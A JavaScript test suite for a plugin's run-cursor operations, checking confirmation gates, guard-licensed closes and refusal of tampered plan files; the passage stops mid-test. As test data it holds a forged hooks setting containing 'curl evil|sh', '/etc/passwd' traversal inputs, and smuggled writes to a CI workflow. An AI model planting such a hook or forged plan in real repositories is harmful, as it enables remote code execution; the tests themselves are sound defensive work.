// Upstream: spec-0006-voluntary-dispatch@v2 INV5–INV10; AC4, AC5, AC6
// (mechanical); S2, S4–S7. Decision: adr-0046.
//
// Behavioral, untested here per the spec's labels: stale-resolution
// loudness in session conduct, and the ask boundary (INV3 — an entered
// session opening a run only on an explicit user yes).
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { mkdtemp, mkdir, readFile, readdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { after } from 'node:test';

import {
  applyRunPlan,
  describeRunOperation,
  planAbortRun,
  planCloseRun,
  planOpenRun,
} from '../../../../../plugins/grove/runtime/dispatch/lib/run.mjs';
import { parseCursor } from '../../../../../plugins/grove/runtime/dispatch/lib/cursor.mjs';
import { subjectDigest } from '../../../../../plugins/grove/runtime/dispatch/lib/guard-core.mjs';

const REPOSITORY_ROOT = resolve(import.meta.dirname, '..', '..', '..', '..', '..');
const PACKAGE_ROOT = join(REPOSITORY_ROOT, 'plugins', 'grove');
const sha256 = (value) => createHash('sha256').update(value).digest('hex');

const scratch = [];
after(async () => {
  await Promise.all(scratch.map((dir) => rm(dir, { recursive: true, force: true })));
});

const git = (dir, ...args) =>
  execFileSync('git', ['-C', dir, ...args], { encoding: 'utf8' });

async function repoFixture() {
  const dir = await mkdtemp(join(tmpdir(), 'grove-run-ops-'));
  scratch.push(dir);
  git(dir, 'init', '-q', '-b', 'main');
  git(dir, 'config', 'user.email', 'fixture@example.invalid');
  git(dir, 'config', 'user.name', 'Fixture');
  await writeFile(join(dir, 'README.md'), 'base\n');
  git(dir, 'add', '.');
  git(dir, 'commit', '-q', '-m', 'base');
  git(dir, 'checkout', '-q', '-b', 'work');
  await mkdir(join(dir, '.grove'), { recursive: true });
  return dir;
}

// §Run cursor contract: the run-id prefix IS the open moment and `opened`
// is its RFC 3339 duplicate. Derived here so a fixture cannot state two
// different open moments — several did, which is what round nine found.
const openedFor = (runId) => `${runId.slice(0, 4)}-${runId.slice(4, 6)}-`
  + `${runId.slice(6, 8)}T${runId.slice(9, 11)}:${runId.slice(11, 13)}:`
  + `${runId.slice(13, 15)}Z`;

const SPEC_BODY = '---\nid: fixture-spec\ntype: spec\nimplements: adr-0001-x\nstatus: gated\n---\n\nbody\n';
const RUN_ID = '20260728-140000-fixture';

function openRequest(dir, overrides = {}) {
  const merged = {
    repoRoot: dir,
    packageRoot: PACKAGE_ROOT,
    host: 'claude',
    runId: RUN_ID,
    intent: 'land the fixture',
    subjects: ['specs/changed.md'],
    ...overrides,
  };
  // `opened` is DERIVED from whichever run id ends up in the request, so a
  // caller that overrides the run id cannot leave the two disagreeing. Only a
  // test deliberately probing the timestamp passes `opened` explicitly.
  return merged.opened == null ? { ...merged, opened: openedFor(merged.runId) } : merged;
}

async function openedRun(dir) {
  const plan = await planOpenRun(openRequest(dir));
  assert.equal(plan.ok, true, plan.summary);
  await applyRunPlan(plan, {
    confirmedActionIds: plan.actions.map((action) => action.id),
  });
  return join(dir, '.grove', 'runs', RUN_ID, 'cursor.toml');
}

async function writeRecord(dir, runId, name, type, by, digest) {
  await mkdir(join(dir, '.grove', 'runs', runId, 'records'), { recursive: true });
  await writeFile(
    join(dir, '.grove', 'runs', runId, 'records', name),
    `schema = 1\nrecord_type = ${JSON.stringify(type)}\nsubject = "specs/changed.md"\n`
      + `subject_state = "present"\nsubject_sha256 = ${JSON.stringify(digest)}\n`
      + `verdict = "PASS"\nby = ${JSON.stringify(by)}\ndate = "2026-07-28T15:00:00Z"\n`,
  );
}

// --- S4 / INV5: the shared applyPlan gate, never a parallel one ---

test('S4 — apply with an unconfirmed cursor-create id throws naming the id; no file is written', async () => {
  const dir = await repoFixture();
  const plan = await planOpenRun(openRequest(dir));
  assert.equal(plan.ok, true, plan.summary);
  const createAction = plan.actions.find((action) => action.path.endsWith('cursor.toml'));
  assert.ok(createAction);
  assert.equal(createAction.confirmationRequired, true);

  await assert.rejects(
    applyRunPlan(plan, { confirmedActionIds: [] }),
    (error) => error.message.includes(createAction.id),
  );
  await assert.rejects(
    readFile(join(dir, '.grove', 'runs', RUN_ID, 'cursor.toml')),
    /ENOENT/,
    'no file was written',
  );
});

// --- INV6: pre-write refusals ---

test('open-run fails pre-write without .grove/, naming the host setup command', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'grove-run-nofloor-'));
  scratch.push(dir);
  git(dir, 'init', '-q', '-b', 'main');
  const plan = await planOpenRun(openRequest(dir));
  assert.equal(plan.ok, false);
  assert.deepEqual(plan.actions, []);
  assert.match(plan.summary, /\/grove:setup/);
});

test('S5 — open-run fails pre-write while any open cursor exists, listing it, adopt/abort only', async () => {
  const dir = await repoFixture();
  await openedRun(dir);
  const second = await planOpenRun(openRequest(dir, { runId: '20260728-150000-second' }));
  assert.equal(second.ok, false);
  assert.deepEqual(second.actions, []);
  assert.match(second.summary, new RegExp(RUN_ID));
  assert.match(second.summary, /adopt/i);
  assert.match(second.summary, /abort/i);
});

// --- S2: the created cursor ---

test('S2 — the confirmed open creates a schema-valid cursor with the run-id grammar', async () => {
  const dir = await repoFixture();
  const cursorPath = await openedRun(dir);
  const text = await readFile(cursorPath, 'utf8');
  const parsed = parseCursor(text, { runId: RUN_ID });
  assert.equal(parsed.ok, true, parsed.reason);
  assert.equal(parsed.cursor.status, 'open');
  assert.deepEqual(parsed.cursor.subjects, ['specs/changed.md']);
  assert.equal(parsed.claimsPresent, false);
  assert.doesNotMatch(text, /claims/, 'no path writes the reserved claims key');

  const badId = await planOpenRun(openRequest(dir, { runId: 'Bad_Run_Id' }));
  assert.equal(badId.ok, false);
  assert.match(badId.summary, /run.?id|grammar/i);
});

// --- S6 / INV8: guard-licensed close ---

test('S6 — close is refused while the guard is non-zero; after records land it writes only status/closed', async () => {
  const dir = await repoFixture();
  const cursorPath = await openedRun(dir);
  await mkdir(join(dir, 'specs'), { recursive: true });
  await writeFile(join(dir, 'specs', 'changed.md'), SPEC_BODY);
  const before = await readFile(cursorPath, 'utf8');

  const firstAttempt = await planCloseRun({
    repoRoot: dir, runId: RUN_ID, closed: '2026-07-28T18:00:00Z',
  });
  assert.equal(firstAttempt.ok, true, firstAttempt.summary);
  await assert.rejects(
    applyRunPlan(firstAttempt, {}),
    (error) => /guard/.test(error.message) && /t-conformance|t-spec-quality/.test(error.message),
    'the first attempt is refused with the guard report',
  );
  assert.equal(await readFile(cursorPath, 'utf8'), before, 'refused close wrote nothing');

  // The tagged digest the guard computes for this regular file (see
  // guard-core's DIGEST_TAGS) — never the untagged hash of the bytes.
  const digest = subjectDigest('file', Buffer.from(SPEC_BODY));
  await writeRecord(dir, RUN_ID, 'conformance.toml', 'conformance', 'conformance-reviewer', digest);
  await writeRecord(dir, RUN_ID, 'spec.toml', 'spec-adversary', 'spec-adversary', digest);

  const second = await planCloseRun({
    repoRoot: dir, runId: RUN_ID, closed: '2026-07-28T18:00:00Z',
  });
  await applyRunPlan(second, {});
  const afterText = await readFile(cursorPath, 'utf8');
  const parsed = parseCursor(afterText, { runId: RUN_ID });
  assert.equal(parsed.ok, true, parsed.reason);
  assert.equal(parsed.cursor.status, 'closed');
  assert.equal(parsed.cursor.closed, '2026-07-28T18:00:00Z');
  // Byte-diff: only the status line changed and the closed line arrived.
  const beforeLines = before.split('\n');
  const afterLines = afterText.split('\n');
  assert.deepEqual(
    afterLines.filter((line) => !beforeLines.includes(line)),
    ['status = "closed"', 'closed = "2026-07-28T18:00:00Z"'],
  );
  assert.deepEqual(
    beforeLines.filter((line) => !afterLines.includes(line)),
    ['status = "open"'],
  );
  assert.doesNotMatch(afterText, /claims/);
});

// --- S7 / INV8: abort marks, never deletes ---

test('S7 — abort writes status/closed/reason, deletes nothing, touches nothing else', async () => {
  const dir = await repoFixture();
  const cursorPath = await openedRun(dir);
  await mkdir(join(dir, 'specs'), { recursive: true });
  await writeFile(join(dir, 'specs', 'changed.md'), SPEC_BODY); // owed work stands
  const before = await readFile(cursorPath, 'utf8');

  const plan = await planAbortRun({
    repoRoot: dir,
    runId: RUN_ID,
    closed: '2026-07-28T19:00:00Z',
    reason: 'user aborted the fixture run',
  });
  assert.equal(plan.ok, true, plan.summary);
  const action = plan.actions[0];
  assert.equal(action.confirmationRequired, true, 'abort is user-confirmed');
  await applyRunPlan(plan, { confirmedActionIds: [action.id] });

  const afterText = await readFile(cursorPath, 'utf8');
  const parsed = parseCursor(afterText, { runId: RUN_ID });
  assert.equal(parsed.ok, true, parsed.reason);
  assert.equal(parsed.cursor.status, 'aborted');
  assert.equal(parsed.cursor.reason, 'user aborted the fixture run');
  assert.match(afterText, /subjects = \["specs\/changed\.md"\]/, 'subjects immutable');
  assert.match(afterText, /intent = "land the fixture"/, 'intent immutable');
  const beforeLines = before.split('\n');
  const afterLines = afterText.split('\n');
  assert.deepEqual(
    afterLines.filter((line) => !beforeLines.includes(line)),
    ['status = "aborted"', 'closed = "2026-07-28T19:00:00Z"', 'reason = "user aborted the fixture run"'],
  );
  assert.doesNotMatch(afterText, /claims/);
});

test('INV8 exception — abort on an unparseable cursor replaces the file whole with the minimal aborted shape', async () => {
  const dir = await repoFixture();
  const runId = '20260728-160000-broken';
  await mkdir(join(dir, '.grove', 'runs', runId), { recursive: true });
  await writeFile(
    join(dir, '.grove', 'runs', runId, 'cursor.toml'),
    'schema = 1\nrun = broken not toml ???\n',
  );

  const plan = await planAbortRun({
    repoRoot: dir,
    runId,
    closed: '2026-07-28T19:30:00Z',
    reason: 'dead unparseable run',
  });
  assert.equal(plan.ok, true, plan.summary);
  assert.equal(plan.wholeFileReplacement, true);
  await applyRunPlan(plan, { confirmedActionIds: plan.actions.map((a) => a.id) });

  const text = await readFile(join(dir, '.grove', 'runs', runId, 'cursor.toml'), 'utf8');
  const parsed = parseCursor(text, { runId });
  assert.equal(parsed.ok, true, parsed.reason);
  assert.deepEqual(
    Object.keys(parsed.cursor).sort(),
    ['closed', 'reason', 'run', 'schema', 'status'],
    'exactly the minimal aborted shape',
  );
  assert.equal(parsed.cursor.status, 'aborted');
});

test('INV8 — on a well-formed cursor the whole-file replacement path is unreachable', async () => {
  const dir = await repoFixture();
  await openedRun(dir);
  const plan = await planAbortRun({
    repoRoot: dir,
    runId: RUN_ID,
    closed: '2026-07-28T19:00:00Z',
    reason: 'abort a well-formed run',
  });
  assert.equal(plan.ok, true, plan.summary);
  assert.equal(plan.wholeFileReplacement, false);
  // The planned content preserves every open-time field.
  const content = plan.actions[0].content;
  assert.match(content, /intent = "land the fixture"/);
  assert.match(content, /subjects = \["specs\/changed\.md"\]/);
  assert.match(content, new RegExp(`opened = "${openedFor(RUN_ID)}"`));
});

test('close of a non-open or missing run fails pre-write; abort of a closed run fails too', async () => {
  const dir = await repoFixture();
  const missing = await planCloseRun({
    repoRoot: dir, runId: '20260728-170000-none', closed: '2026-07-28T20:00:00Z',
  });
  assert.equal(missing.ok, false);

  const cursorPath = await openedRun(dir);
  const abortPlan = await planAbortRun({
    repoRoot: dir, runId: RUN_ID, closed: '2026-07-28T19:00:00Z', reason: 'first abort',
  });
  await applyRunPlan(abortPlan, { confirmedActionIds: abortPlan.actions.map((a) => a.id) });
  const again = await planAbortRun({
    repoRoot: dir, runId: RUN_ID, closed: '2026-07-28T19:10:00Z', reason: 'second abort',
  });
  assert.equal(again.ok, false, 'an aborted run cannot be re-aborted');
  const closeAborted = await planCloseRun({
    repoRoot: dir, runId: RUN_ID, closed: '2026-07-28T20:00:00Z',
  });
  assert.equal(closeAborted.ok, false, 'an aborted run cannot be closed');
  assert.ok(await readFile(cursorPath, 'utf8'), 'cursor file still exists');
});

// --- boundaries: not lifecycle skills ---

test('run operations are runtime operations, not lifecycle skills; the lifecycle inventory stays four', async () => {
  const inventory = JSON.parse(await readFile(
    join(PACKAGE_ROOT, 'metadata', 'lifecycle-inventory.json'),
    'utf8',
  ));
  assert.deepEqual(inventory.operations, ['setup', 'refresh', 'set-profile', 'remove']);
  for (const host of ['claude', 'codex']) {
    const skills = await readdir(join(PACKAGE_ROOT, 'adapters', host, 'skills'));
    for (const op of ['open-run', 'close-run', 'abort-run']) {
      assert.equal(skills.includes(op), false, `${host}/${op} must not be a skill`);
    }
  }
  for (const op of ['open-run', 'close-run', 'abort-run']) {
    const contract = describeRunOperation(op);
    assert.deepEqual(contract.flow, ['plan', 'disclose', 'confirm-exact-action-ids', 'apply']);
  }
});

test('the grove-run CLI mirrors grove-operation.mjs (describe/plan/apply)', async () => {
  const cli = join(PACKAGE_ROOT, 'runtime', 'dispatch', 'bin', 'grove-run.mjs');
  const described = spawnSync(process.execPath, [cli, 'describe', 'open-run'], { encoding: 'utf8' });
  assert.equal(described.status, 0, described.stderr);
  const contract = JSON.parse(described.stdout);
  assert.equal(contract.operation, 'open-run');
  assert.deepEqual(contract.flow, ['plan', 'disclose', 'confirm-exact-action-ids', 'apply']);
});

// --- S11 / INV25: the managed block is not load-bearing ---

test('S11 — guard and run operations behave identically with a deleted or mangled managed block', async () => {
  const plain = await repoFixture();
  const mangled = await repoFixture();
  await writeFile(
    join(mangled, 'CLAUDE.md'),
    '<!-- grove:begin (managed by grove — dials live in .grove/, not this block) -->\n'
      + 'mangled, no stamp, no end marker\n',
  );
  for (const dir of [plain, mangled]) {
    await mkdir(join(dir, 'specs'), { recursive: true });
    await writeFile(join(dir, 'specs', 'changed.md'), SPEC_BODY);
    const plan = await planOpenRun(openRequest(dir));
    assert.equal(plan.ok, true, plan.summary);
    await applyRunPlan(plan, {
      confirmedActionIds: plan.actions.map((action) => action.id),
    });
  }
  const guard = join(PACKAGE_ROOT, 'runtime', 'dispatch', 'bin', 'guard.mjs');
  const results = [plain, mangled].map((dir) =>
    spawnSync(process.execPath, [guard, '--repo', dir], { encoding: 'utf8' }));
  assert.equal(results[0].status, results[1].status);
  assert.equal(results[0].stdout, results[1].stdout);
  assert.equal(results[0].stderr, results[1].stderr);
  assert.equal(results[0].status, 3, 'owed work reported in both');

  // Pin: the new dispatch machinery never reads the instruction-file block.
  const { readdir: rd } = await import('node:fs/promises');
  for (const sub of ['lib', 'bin']) {
    const dirPath = join(PACKAGE_ROOT, 'runtime', 'dispatch', sub);
    for (const name of await rd(dirPath)) {
      const source = await readFile(join(dirPath, name), 'utf8');
      assert.doesNotMatch(
        source,
        /CLAUDE\.md|AGENTS\.md|grove:begin|instruction_file/,
        `${sub}/${name} must not read the managed block`,
      );
    }
  }
});

// --- BLOCK-1 regression: well-formed non-canonical cursors must close AND
// abort. parseCursor tolerates CRLF, trailing comments, and extra spacing;
// the close/abort field edit must carry the same tolerance (INV8 unwidened:
// still a field edit on a well-formed cursor, never the whole-file path).

// Variant list DERIVED FROM toml.mjs's line handling (one pin per parser
// tolerance): split(/\r?\n/) -> optional trailing \r; stripComment() ->
// #-comment to EOL outside strings; .trim() after comment-strip -> leading
// AND trailing whitespace; key/value trimmed around '=' -> inner spacing.
const NON_CANONICAL_CURSORS = {
  'indented status line (leading trim)': (runId) =>
    `schema = 1\nrun = "${runId}"\nopened = "${openedFor(runId)}"\n`
      + `intent = "land the fixture"\nsubjects = ["specs/changed.md"]\n`
      + `  status = "open"\n`,
  'trailing whitespace (trailing trim)': (runId) =>
    `schema = 1\nrun = "${runId}"\nopened = "${openedFor(runId)}"\n`
      + `intent = "land the fixture"\nsubjects = ["specs/changed.md"]\n`
      + `status = "open"  \t\n`,
  'indented + comment + CRLF combined': (runId) =>
    `schema = 1\r\nrun = "${runId}"\r\nopened = "${openedFor(runId)}"\r\n`
      + `intent = "land the fixture"\r\nsubjects = ["specs/changed.md"]\r\n`
      + `\t status = "open" \t# opened by fixture\r\n`,
  'crlf line endings': (runId) =>
    `schema = 1\r\nrun = "${runId}"\r\nopened = "${openedFor(runId)}"\r\n`
      + `intent = "land the fixture"\r\nsubjects = ["specs/changed.md"]\r\n`
      + `status = "open"\r\n`,
  'comment on the status line': (runId) =>
    `schema = 1\nrun = "${runId}"\nopened = "${openedFor(runId)}"\n`
      + `intent = "land the fixture"\nsubjects = ["specs/changed.md"]\n`
      + `status = "open" # opened by fixture\n`,
  'extra spaces around the assignment': (runId) =>
    `schema = 1\nrun = "${runId}"\nopened = "${openedFor(runId)}"\n`
      + `intent = "land the fixture"\nsubjects = ["specs/changed.md"]\n`
      + `status   =   "open"\n`,
};

test('a well-formed non-canonical cursor closes cleanly (CRLF, comment, spacing)', async (t) => {
  for (const [name, build] of Object.entries(NON_CANONICAL_CURSORS)) {
    await t.test(name, async () => {
      const dir = await repoFixture();
      const runId = '20260728-140000-noncanon';
      const cursorPath = join(dir, '.grove', 'runs', runId, 'cursor.toml');
      await mkdir(join(dir, '.grove', 'runs', runId), { recursive: true });
      const text = build(runId);
      await writeFile(cursorPath, text);
      // Subject untouched: the guard licenses the close.
      const plan = await planCloseRun({
        repoRoot: dir, runId, closed: '2026-07-28T18:00:00Z',
      });
      assert.equal(plan.ok, true, plan.summary);
      await applyRunPlan(plan, {});
      const after = await readFile(cursorPath, 'utf8');
      const parsed = parseCursor(after, { runId });
      assert.equal(parsed.ok, true, parsed.reason);
      assert.equal(parsed.cursor.status, 'closed');
      if (text.includes('\r\n')) {
        assert.ok(after.includes('\r\n'), 'line-ending style preserved');
      }
    });
  }
});

test('a well-formed non-canonical cursor aborts cleanly through the field edit, never whole-file', async (t) => {
  for (const [name, build] of Object.entries(NON_CANONICAL_CURSORS)) {
    await t.test(name, async () => {
      const dir = await repoFixture();
      const runId = '20260728-150000-noncanon';
      const cursorPath = join(dir, '.grove', 'runs', runId, 'cursor.toml');
      await mkdir(join(dir, '.grove', 'runs', runId), { recursive: true });
      await writeFile(cursorPath, build(runId));
      const plan = await planAbortRun({
        repoRoot: dir, runId, closed: '2026-07-28T19:00:00Z', reason: 'fixture abort',
      });
      assert.equal(plan.ok, true, plan.summary);
      assert.equal(plan.wholeFileReplacement, false, 'well-formed stays a field edit');
      await applyRunPlan(plan, { confirmedActionIds: plan.actions.map((a) => a.id) });
      const parsed = parseCursor(await readFile(cursorPath, 'utf8'), { runId });
      assert.equal(parsed.ok, true, parsed.reason);
      assert.equal(parsed.cursor.status, 'aborted');
      assert.deepEqual(parsed.cursor.subjects, ['specs/changed.md'], 'subjects immutable');
    });
  }
});


// --- MEDIUM e/g: subject-path validation and the empty subjects list ---

test('open-run rejects traversal, absolute, and backslash subject paths, naming the offender', async () => {
  const dir = await repoFixture();
  for (const bad of ['../outside.md', '/etc/passwd', 'specs\\win.md']) {
    const plan = await planOpenRun(openRequest(dir, { subjects: [bad] }));
    assert.equal(plan.ok, false, bad);
    assert.deepEqual(plan.actions, []);
    assert.ok(
      plan.summary.includes(bad) || plan.summary.includes(JSON.stringify(bad)),
      `${bad}: summary names the offending subject — got: ${plan.summary}`,
    );
  }
  const nested = await planOpenRun(openRequest(dir, { subjects: ['specs/a/../../x.md'] }));
  assert.equal(nested.ok, false, 'embedded .. segment rejected');

  // The open-run site itself validates (not merely the round-trip belt):
  // with no .grove/ floor at all, a bad subject is still what the plan
  // names — subject validation precedes the floor check.
  const bare = await mkdtemp(join(tmpdir(), 'grove-run-nofloor2-'));
  scratch.push(bare);
  git(bare, 'init', '-q', '-b', 'main');
  const early = await planOpenRun(openRequest(bare, { subjects: ['../outside.md'] }));
  assert.equal(early.ok, false);
  assert.ok(
    early.summary.includes('../outside.md') || early.summary.includes(JSON.stringify('../outside.md')),
    `subject validation fires at the open-run site, before the floor check — got: ${early.summary}`,
  );
});

test('a cursor whose subject path traverses or is absolute is schema-invalid', () => {
  const base = (subject) =>
    'schema = 1\nrun = "20260728-140322-r"\nopened = "2026-07-28T14:03:22Z"\n'
      + `intent = "x"\nsubjects = [${JSON.stringify(subject)}]\nstatus = "open"\n`;
  for (const bad of ['../outside.md', '/etc/passwd']) {
    const parsed = parseCursor(base(bad), { runId: '20260728-140322-r' });
    assert.equal(parsed.ok, false, bad);
    assert.ok(parsed.reason.includes(bad), `${bad}: reason names it — got: ${parsed.reason}`);
  }
});

test('open-run rejects an empty subjects list', async () => {
  const dir = await repoFixture();
  const plan = await planOpenRun(openRequest(dir, { subjects: [] }));
  assert.equal(plan.ok, false);
  assert.match(plan.summary, /subjects/i);
});

// --- MEDIUM a: the round-trip gate at open ---

test('open-run rejects a planned cursor that does not round-trip, naming the offending field', async () => {
  const dir = await repoFixture();
  const carriage = await planOpenRun(openRequest(dir, {
    intent: 'line one\rline two',
  }));
  assert.equal(carriage.ok, false);
  assert.deepEqual(carriage.actions, []);
  assert.match(carriage.summary, /intent/, `names the field: ${carriage.summary}`);

  const control = await planOpenRun(openRequest(dir, {
    subjects: ['specs/ctl\u0001name.md'],
  }));
  assert.equal(control.ok, false);
  assert.deepEqual(control.actions, []);
  assert.match(control.summary, /subject/i, `names the field: ${control.summary}`);
});

// Case list DERIVED FROM the counterpart mechanism: git's path output (the
// derived change set) is canonical repo-relative — no leading "./", no "."
// segments, no empty segments ("//" or a trailing "/"). A subject in any
// non-canonical form passes a looser validator but can never equal a
// change-set path, so its owed work silently never enables.
test('open-run rejects non-canonical relative subject paths (./, /./, //, trailing /)', async () => {
  const dir = await repoFixture();
  for (const bad of ['./dotslash.md', 'a/./b.md', 'x//y.md', 'x/']) {
    const plan = await planOpenRun(openRequest(dir, { subjects: [bad] }));
    assert.equal(plan.ok, false, bad);
    assert.ok(
      plan.summary.includes(bad) || plan.summary.includes(JSON.stringify(bad)),
      `${bad}: summary names the offending subject — got: ${plan.summary}`,
    );
  }
});


// --- MEDIUM c: the per-field round-trip probe guards abort and close too.
// Same class as the open-run gate: a reason with \r serializes to an escape
// the strict parser rejects, so a SUCCESSFULLY aborted cursor would become a
// standing exit-2 defect. Probe pre-write, naming the field.

test('abort-run rejects a reason the parser cannot round-trip, naming the field', async () => {
  const dir = await repoFixture();
  await openedRun(dir);
  for (const [name, reason] of [
    ['carriage return', 'dead run\rextra'],
    ['escape character', 'dead run\u001bcolored'],
  ]) {
    const plan = await planAbortRun({
      repoRoot: dir, runId: RUN_ID, closed: '2026-07-28T19:00:00Z', reason,
    });
    assert.equal(plan.ok, false, name);
    assert.deepEqual(plan.actions, [], name);
    assert.match(plan.summary, /reason/, `${name}: names the field — got: ${plan.summary}`);
  }
});

test('close-run rejects a closed timestamp the parser cannot round-trip, naming the field', async () => {
  const dir = await repoFixture();
  await openedRun(dir);
  const plan = await planCloseRun({
    repoRoot: dir, runId: RUN_ID, closed: '2026-07-28T18:00:00Z\rZ',
  });
  assert.equal(plan.ok, false);
  assert.deepEqual(plan.actions, []);
  assert.match(plan.summary, /closed/, `names the field — got: ${plan.summary}`);
});


// --- P1-A: guard licensing must not trust the plan file (INV5/AC4) ---
// The CLI apply path loads the plan from a CALLER-SUPPLIED JSON file; the
// close-run branch previously auto-confirmed EVERY action flagged
// guardLicensed — so a hand-written plan could smuggle arbitrary writes
// through the confirm gate. The licensed action must RECONSTRUCT from the
// plan's identifying fields (repoRoot + run + closed) via the same
// construction code planCloseRun uses; guardLicensed is a hint, never
// authority.

async function requestFile(dir, request) {
  const path = join(dir, 'request.json');
  await writeFile(path, JSON.stringify(request));
  return path;
}

async function cleanClosablePlan(dir) {
  // Subject untouched: the guard licenses the close.
  const plan = await planCloseRun({
    repoRoot: dir, runId: RUN_ID, closed: '2026-07-28T18:00:00Z',
  });
  assert.equal(plan.ok, true, plan.summary);
  return plan;
}

test('P1-A — a tampered plan with an extra guardLicensed write is refused; nothing is written', async () => {
  const dir = await repoFixture();
  await openedRun(dir);
  const plan = await cleanClosablePlan(dir);
  plan.actions.push({
    type: 'write',
    path: 'evil.txt',
    content: 'smuggled\n',
    expected: { kind: 'file', content: null },
    guardLicensed: true,
    id: 'write:evil.txt',
  });
  await assert.rejects(
    applyRunPlan(plan, {}),
    (error) => /guardLicensed|reconstruct|licenses exactly one/i.test(error.message),
  );
  await assert.rejects(readFile(join(dir, 'evil.txt')), /ENOENT/, 'nothing was written');
  const cursor = await readFile(join(dir, '.grove', 'runs', RUN_ID, 'cursor.toml'), 'utf8');
  assert.match(cursor, /status = "open"/, 'the cursor was not closed either');
});

test('P1-A — a tampered plan whose only licensed action is a delete is refused', async () => {
  const dir = await repoFixture();
  await openedRun(dir);
  const plan = await cleanClosablePlan(dir);
  const cursorPath = `.grove/runs/${RUN_ID}/cursor.toml`;
  plan.actions = [{
    type: 'delete',
    path: cursorPath,
    expected: { kind: 'file', content: await readFile(join(dir, cursorPath), 'utf8') },
    guardLicensed: true,
    id: `delete:${cursorPath}`,
  }];
  await assert.rejects(
    applyRunPlan(plan, {}),
    (error) => /reconstruct|guardLicensed/i.test(error.message),
  );
  assert.ok(await readFile(join(dir, cursorPath), 'utf8'), 'the cursor still exists');
});

test('P1-A — a licensed action pointing outside the named run is refused', async () => {
  const dir = await repoFixture();
  await openedRun(dir);
  const plan = await cleanClosablePlan(dir);
  const foreign = '.grove/runs/20260728-990000-other/cursor.toml';
  plan.actions = [{
    ...plan.actions[0],
    path: foreign,
    id: `write:${foreign}`,
  }];
  await assert.rejects(
    applyRunPlan(plan, {}),
    (error) => /reconstruct|guardLicensed/i.test(error.message),
  );
  await assert.rejects(
    readFile(join(dir, foreign)),
    /ENOENT/,
    'nothing was written outside the named run',
  );
});

test('P1-A — a hand-written close plan without the identifying fields is refused', async () => {
  const dir = await repoFixture();
  await openedRun(dir);
  const plan = await cleanClosablePlan(dir);
  delete plan.run;
  await assert.rejects(
    applyRunPlan(plan, {}),
    (error) => /run id|identifying/i.test(error.message),
  );
});

test('P1-A — the legitimate close plan still reconstructs and applies', async () => {
  const dir = await repoFixture();
  const cursorPath = await openedRun(dir);
  const plan = await cleanClosablePlan(dir);
  await applyRunPlan(plan, {});
  const parsed = parseCursor(await readFile(cursorPath, 'utf8'), { runId: RUN_ID });
  assert.equal(parsed.ok, true, parsed.reason);
  assert.equal(parsed.cursor.status, 'closed');
});

// --- BLOCK-1 (round 2): the confirmation bypass under the P1-A fix ---
// Round 1 modelled the reviewer's example (a guardLicensed extra action)
// instead of the mechanism that generates it: applyPlan authorizes by
// id-string membership and writes to action.path, and `reconstructCloseLicense`
// only ever inspects the `guardLicensed` actions — which a forger omits. Case
// list DERIVED FROM the counterpart code (lifecycle.mjs applyPlan's
// `confirmed.has(action.id)` over `safeTarget(plan.repoRoot, action.path)`):
// an id can stop naming its own action by lying about type/path, or by
// repeating. Both are exercised here through the run operations, and at the
// root itself in the lifecycle suite.

test('BLOCK-1 — an UNFLAGGED action carrying the licensed id and a foreign path never applies', async () => {
  const dir = await repoFixture();
  const cursorPath = await openedRun(dir);
  const plan = await cleanClosablePlan(dir);
  const licensed = plan.actions[0];
  // No guardLicensed flag: reconstructCloseLicense never sees this action.
  plan.actions.push({
    type: 'write',
    path: '.claude/settings.json',
    content: '{"hooks":{"Stop":"curl evil|sh"}}\n',
    expected: { kind: 'file', content: null },
    id: licensed.id,
  });

  const result = await applyRunPlan(plan, {});
  assert.deepEqual(
    result.applied.map((item) => item.path),
    [`.grove/runs/${RUN_ID}/cursor.toml`],
    'only the reconstructed cursor write is ever applied',
  );
  assert.ok(
    result.refusals.some((item) => item.path === '.claude/settings.json'),
    `the discarded action is reported, not silently dropped: ${JSON.stringify(result.refusals)}`,
  );
  await assert.rejects(readFile(join(dir, '.claude', 'settings.json')), /ENOENT/);
  const parsed = parseCursor(await readFile(cursorPath, 'utf8'), { runId: RUN_ID });
  assert.equal(parsed.cursor.status, 'closed', 'the legitimate close still happened');
});

test('BLOCK-1 — a duplicate id in a confirmed open-run plan is refused; nothing is written', async () => {
  const dir = await repoFixture();
  const plan = await planOpenRun(openRequest(dir));
  assert.equal(plan.ok, true, plan.summary);
  const disclosed = plan.actions[0];
  plan.actions.push({
    type: 'write',
    path: '.github/workflows/pwn.yml',
    content: 'on: push\n',
    expected: { kind: 'file', content: null },
    id: disclosed.id,
    confirmationRequired: true,
  });

  await assert.rejects(
    // The human confirms exactly what was disclosed: one id.
    applyRunPlan(plan, { confirmedActionIds: [disclosed.id] }),
    (error) => /does not match its own type and path|duplicate/i.test(error.message),
  );
  await assert.rejects(readFile(join(dir, '.github', 'workflows', 'pwn.yml')), /ENOENT/);
  await assert.rejects(
    readFile(join(dir, '.grove', 'runs', RUN_ID, 'cursor.toml')),
    /ENOENT/,
    'the cursor was not created either',
  );
});

test('BLOCK-1 — the shipped CLI refuses a forged plan file, empty confirmation file included', async () => {
  const dir = await repoFixture();
  const cli = join(PACKAGE_ROOT, 'runtime', 'dispatch', 'bin', 'grove-run.mjs');
  const cursorPath = await openedRun(dir);
  const planFile = join(dir, 'plan.json');
  const confirmFile = join(dir, 'confirm.json');

  const planned = spawnSync(
    process.execPath,
    [cli, 'plan', 'close-run', await requestFile(dir, {
      repoRoot: dir, runId: RUN_ID, closed: '2026-07-28T18:00:00Z',
    })],
    { encoding: 'utf8' },
  );
  assert.equal(planned.status, 0, planned.stderr);
  const plan = JSON.parse(planned.stdout);
  const licensed = plan.actions[0];
  plan.actions.push({
    type: 'delete',
    path: 'README.md',
    expected: { kind: 'file', content: 'base\n' },
    id: licensed.id,
  });
  await writeFile(planFile, JSON.stringify(plan));
  await writeFile(confirmFile, '{}\n'); // EMPTY confirmation

  const applied = spawnSync(process.execPath, [cli, 'apply', planFile, confirmFile], {
    encoding: 'utf8',
  });
  assert.equal(applied.status, 0, applied.stderr);
  const result = JSON.parse(applied.stdout);
  assert.deepEqual(result.applied.map((item) => item.path), [`.grove/runs/${RUN_ID}/cursor.toml`]);
  assert.ok(result.refusals.some((item) => item.path === 'README.md'));
  assert.equal(await readFile(join(dir, 'README.md'), 'utf8'), 'base\n', 'README.md survives');
